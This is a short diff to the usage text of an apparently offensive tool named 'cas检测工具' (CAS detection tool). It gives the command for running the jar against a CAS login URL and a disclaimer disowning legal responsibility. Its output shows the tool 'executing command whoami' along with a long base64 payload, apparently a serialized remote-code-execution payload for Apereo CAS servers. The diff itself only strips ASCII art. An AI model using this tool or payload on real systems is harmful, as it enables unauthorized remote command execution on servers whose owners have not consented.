@@ -7,20 +7,13 @@ java -jar cas-0.0.1-all.jar  http://localhost:8080/cas-server/login
 
 -----------------------cas检测工具---------------------------------
 -----------本软件仅供学习交流,如作他用所承受的法律责任一概与作者无关---------
-**             **
-* *               * *
-*  *     *  *
-*   *   *   *
-*        * *    *
-*  *  *  *  *
-*               *
-*           *
-*           *
----------use: jar -jar cas-0.0.1-all.jar http://xxxx.xxxx-------
+
+---------use: jar -jar cas-0.0.1-all.jar http://xxxx.xxxx-------  
 
 -------------------create by maobugs----------------------------
 
 执行命令whoami...
+
 payload is: AAAAIgAAABBrUgLwoiwOSTCDnal67lrrAAAABmFlczEyOG2E5KGXIUeDS4otbEU6mQufQIcYPEwC
 AzL9uqiZr4dOaap91C0EktTooeh7aMerjfA+HcOoYp6+UkKC+fVP2HArdF0rM3ug7/8/EQqhNy3o
 hgD6GwoB6NT1QZZ3rP1powA1sdANE7DLcF5wF9OPdamsAQ+lZahnIAFLvCv4uKXcZmNJ05neWXbF
